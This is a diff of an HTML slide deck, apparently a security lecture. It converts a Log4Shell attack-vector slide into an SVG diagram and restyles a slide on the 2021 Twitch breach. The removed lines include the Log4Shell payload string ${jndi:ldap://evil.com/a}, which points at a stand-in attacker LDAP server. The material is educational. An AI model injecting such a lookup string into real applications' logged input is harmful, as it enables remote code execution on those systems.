@@ -40,13 +40,48 @@
 
     <section class="slide">
       <h1>Log4Shell — Attack Vector</h1>
-      <ul>
-        <li>Payload: <code>${jndi:ldap://evil.com/a}</code></li>
-        <li>Будь-яке logged user input</li>
-        <li>User-Agent, form fields, headers</li>
-        <li>LDAP/RMI server повертає malicious class</li>
-        <li>Automatic deserialization → RCE</li>
-      </ul>
+      <div class="slide-diagram">
+        <svg viewBox="0 0 450 170" width="450" height="170">
+          <!-- Attacker -->
+          <circle cx="50" cy="70" r="25" fill="rgba(239, 68, 68, 0.2)" stroke="#ef4444" stroke-width="2"/>
+          <text x="50" y="75" text-anchor="middle" class="diagram-text-small" fill="#ef4444">Attacker</text>
+
+          <!-- Target App -->
+          <rect x="130" y="45" width="80" height="50" rx="8" fill="rgba(251, 191, 36, 0.2)" stroke="#fbbf24" stroke-width="2"/>
+          <text x="170" y="65" text-anchor="middle" class="diagram-text-small">App</text>
+          <text x="170" y="85" text-anchor="middle" class="diagram-text-small" fill="#fbbf24">Log4j</text>
+
+          <!-- LDAP Server -->
+          <rect x="260" y="45" width="80" height="50" rx="8" fill="rgba(239, 68, 68, 0.2)" stroke="#ef4444" stroke-width="2"/>
+          <text x="300" y="65" text-anchor="middle" class="diagram-text-small" fill="#ef4444">Evil</text>
+          <text x="300" y="85" text-anchor="middle" class="diagram-text-small" fill="#ef4444">LDAP</text>
+
+          <!-- Malicious Class -->
+          <rect x="380" y="45" width="60" height="50" rx="8" fill="rgba(239, 68, 68, 0.3)" stroke="#ef4444" stroke-width="2"/>
+          <text x="410" y="65" text-anchor="middle" class="diagram-text-small" fill="#ef4444">RCE</text>
+          <text x="410" y="85" text-anchor="middle" class="diagram-text-small" fill="#ef4444">Class</text>
+
+          <!-- Arrows with labels -->
+          <line x1="75" y1="70" x2="125" y2="70" stroke="#ef4444" stroke-width="2" marker-end="url(#arrow-log4j)"/>
+          <text x="100" y="60" text-anchor="middle" class="diagram-text-small">${jndi:}</text>
+
+          <line x1="210" y1="70" x2="255" y2="70" stroke="#ef4444" stroke-width="2" marker-end="url(#arrow-log4j)"/>
+          <text x="232" y="60" text-anchor="middle" class="diagram-text-small">lookup</text>
+
+          <line x1="340" y1="70" x2="375" y2="70" stroke="#ef4444" stroke-width="2" marker-end="url(#arrow-log4j)"/>
+          <text x="357" y="60" text-anchor="middle" class="diagram-text-small">load</text>
+
+          <!-- Result -->
+          <rect x="130" y="120" width="290" height="35" rx="6" fill="rgba(239, 68, 68, 0.3)" stroke="#ef4444" stroke-width="2"/>
+          <text x="275" y="143" text-anchor="middle" class="diagram-text-bold" fill="#ef4444">Remote Code Execution</text>
+
+          <defs>
+            <marker id="arrow-log4j" markerWidth="8" markerHeight="8" refX="7" refY="3" orient="auto">
+              <path d="M0,0 L0,6 L8,3 z" fill="#ef4444"/>
+            </marker>
+          </defs>
+        </svg>
+      </div>
     </section>
 
     <section class="slide">
@@ -62,12 +97,13 @@
 
     <section class="slide">
       <h1>Twitch Breach (2021)</h1>
-      <ul>
-        <li><strong>125GB</strong> source code leaked</li>
-        <li>Streamer payouts exposed</li>
-        <li>Internal tools та credentials</li>
-        <li>Причина: server misconfiguration</li>
-        <li>Lesson: <strong>Data classification + access control</strong></li>
+      <div class="slide-box slide-box-danger">
+        <p style="font-size: 2.5rem; margin-bottom: 1rem;"><strong>125GB</strong> source code leaked</p>
+        <p style="font-size: 1.2rem;">Streamer payouts, internal tools, credentials exposed</p>
+      </div>
+      <ul style="margin-top: 1.5rem;">
+        <li><strong>Причина:</strong> Server misconfiguration</li>
+        <li><strong>Lesson:</strong> Data classification + access control</li>
       </ul>
     </section>
 
